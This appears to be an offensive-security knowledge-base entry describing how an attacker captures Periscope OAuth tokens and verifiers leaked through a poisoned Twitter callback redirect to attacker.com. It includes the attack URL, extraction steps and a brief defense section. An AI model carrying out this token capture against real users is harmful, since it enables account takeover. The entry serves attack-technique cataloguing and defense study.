---
id: proc-periscope-oauth-token-capture
tags:
  - token-capture
  - oauth
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Credential Access]]'
commands:
  - '[[commands/victim-redirect-url]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Application Access Token]]'
updated_at: '2025-12-14T17:33:34.231Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Application Access Token]]'
---
# Capture-OAuth-Tokens-from-Victim-Redirect

## Summary

This procedure monitors the attacker's domain to capture the OAuth token and verifier leaked in the victim's post-authorization redirect.

## Description

After victim authorization, Twitter redirects to the poisoned callback URL on the attacker's domain: https://attacker.com/www.periscope.tv/i/twitter/loginComplete?oauth_token=[token]&oauth_verifier=[verifier]. The attacker logs this request to extract the parameters, enabling the final takeover step.

## Requirements

1. Attacker domain configured to log incoming requests
2. Proxy or server logs accessible
3. Valid session from initial poisoning

## Defense

Defensive measures and detection strategies:

- Enforce state parameters in OAuth to prevent CSRF in redirects
- Validate callback domains strictly in OAuth configuration
- Alert on redirects to untrusted domains

## Objectives

1. Receive victim's redirect
2. Extract oauth_token and oauth_verifier
3. Store for completion request

## Instructions

### Step 1: Monitor for Redirect

**Context**: Log the incoming GET request to the poisoned callback path.

**Command** ([[commands/victim-redirect-url]]):
```http
https://www.example.com/www.periscope.tv/i/twitter/loginComplete?oauth_token=[attacker's oauth token]&oauth_verifier=[victim's oauth verifier]
```

> Parse query parameters; expected output is URL with token and verifier visible in logs.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]]

### Techniques

- [[Application Access Token]]

### Sub-Techniques


## Commands Used

- [[commands/victim-redirect-url]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- token-capture
- oauth
